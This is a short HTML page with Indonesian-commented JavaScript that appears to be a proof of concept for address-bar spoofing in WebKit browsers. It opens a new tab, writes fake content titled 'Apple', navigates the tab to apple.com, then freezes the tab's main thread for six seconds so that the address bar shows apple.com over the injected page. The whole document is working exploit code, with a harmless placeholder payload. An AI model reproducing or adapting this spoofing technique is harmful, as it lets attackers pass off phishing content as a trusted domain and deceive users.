<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Persistent Lock - HALLO</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #000;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      button {
        width: 100%;
        max-width: 400px;
        padding: 22px;
        font-size: 18px;
        font-weight: bold;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(0, 122, 255, 0.4);
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="startBtn">CLICK TO LOCK APPLE.COM</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membuka tab baru secara bersih (Bypass about:blank via window.open kosong)
        const newTab = window.open("", "_blank");

        if (newTab) {
          // 2. Menyuntikkan dokumen awal dengan tulisan "HALLO"
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
            </body>
            </html>
          `);
          newTab.document.close();

          try { newTab.focus(); } catch (e) {}

          // 3. Timing Tarikan Navigasi (10ms): Menarik alamat browser ke apple.com agar address bar berubah
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 10);

          // 4. Timing Penguncian Agresif (30ms): Mengunci main thread dan memaksa dokumen tetap "HALLO"
          setTimeout(() => {
            try {
              newTab.eval(`
                const startTime = Date.now();
                // Membekukan thread selama 6 detik penuh untuk mengamankan state desynchronization
                while (Date.now() - startTime < 6000) {
                  // Memaksa kalkulasi layout reflow agar WebKit tidak sempat memproses render jaringan luar
                  const reflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fcfcfc';

                  // Proteksi tambahan: Jika elemen hilang atau tertimpa, paksa tulis ulang teks "HALLO" secara instan
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                }
              `);
            } catch (e) {
              // Fallback lokal jika terhalang cross-origin policy
              let start = Date.now();
              while (Date.now() - start < 6000) {}
            }
          }, 30);
        }
      };
    </script>
  </body>
</html>
